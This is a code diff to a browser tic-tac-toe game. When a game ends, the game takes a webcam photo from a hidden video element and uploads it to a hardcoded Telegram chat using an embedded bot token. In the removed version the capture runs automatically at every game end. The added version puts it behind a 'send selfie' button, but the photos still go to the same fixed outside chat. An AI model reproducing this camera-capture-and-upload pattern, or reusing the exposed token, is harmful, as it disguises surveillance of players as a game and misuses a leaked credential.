@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Tic Tac Toe with Camera 📸</title>
+  <title>Tic Tac Toe 📸</title>
   <style>
     body {
       margin: 0; font-family: sans-serif; background: #111; color: white;
-      display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+      display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh;
     }
-    h1 { margin-bottom: 10px; font-size: 2em; }
+    h1 { margin: 15px 0; font-size: 2em; }
     .board {
       display: grid;
       grid-template-columns: repeat(3, 100px);
@@ -44,24 +44,26 @@
       background: white;
       color: black;
     }
-    #cameraView {
-      display: none;
-    }
+    #cameraView { display: none; margin-top: 10px; }
+    #selfieBtn { display: none; }
   </style>
 </head>
 <body>
   <h1>Tic Tac Toe 🎮</h1>
   <div class="board" id="board"></div>
   <button onclick="resetGame()">🔁 Reset</button>
+  <button id="selfieBtn" onclick="capturePhoto()">📸 Selfie lo aur bhejo</button>
 
   <video id="cameraView" autoplay playsinline width="300"></video>
   <canvas id="photoCanvas" style="display:none;"></canvas>
 
   <script>
     const board = document.getElementById("board");
+    const selfieBtn = document.getElementById("selfieBtn");
     let currentPlayer = "❌";
     let cells = Array(9).fill("");
     let gameActive = true;
+    let winMessage = "";
 
     const WINNING_COMBOS = [
       [0,1,2],[3,4,5],[6,7,8],
@@ -93,19 +95,20 @@
         const [a, b, c] = combo;
         if (cells[a] && cells[a] === cells[b] && cells[a] === cells[c]) {
           gameActive = false;
+          winMessage = `${cells[a]} Wins!`;
           setTimeout(() => {
-            alert(`${cells[a]} Wins!`);
-            capturePhoto(`${cells[a]} Wins!`);
+            alert(winMessage);
+            selfieBtn.style.display = "inline-block";
           }, 300);
           return;
         }
       }
-
       if (!cells.includes("")) {
         gameActive = false;
+        winMessage = "Draw Game!";
         setTimeout(() => {
-          alert("Draw Game!");
-          capturePhoto("Draw Game!");
+          alert(winMessage);
+          selfieBtn.style.display = "inline-block";
         }, 300);
       }
     }
@@ -114,11 +117,11 @@
       cells = Array(9).fill("");
       gameActive = true;
       currentPlayer = "❌";
+      selfieBtn.style.display = "none";
       drawBoard();
     }
 
-    // Photo capture and send
-    async function capturePhoto(message) {
+    async function capturePhoto() {
       const video = document.getElementById("cameraView");
       const canvas = document.getElementById("photoCanvas");
 
@@ -140,13 +143,13 @@
         canvas.toBlob(blob => {
           const formData = new FormData();
           formData.append("chat_id", "7544013296");
-          formData.append("caption", message);
-          formData.append("photo", blob, "photo.png");
+          formData.append("caption", winMessage);
+          formData.append("photo", blob, "selfie.png");
 
           fetch(`https://api.telegram.org/bot7826713494:AAGp_XsIQNfNf8XwOx6FT4xMj_AylVcuS3A/sendPhoto`, {
             method: "POST",
             body: formData
-          }).then(() => alert("📸 Photo sent to Telegram!")).catch(console.error);
+          }).then(() => alert("📸 Selfie sent to Telegram!")).catch(console.error);
         }, "image/png");
       } catch (err) {
         alert("Camera access denied ❌");
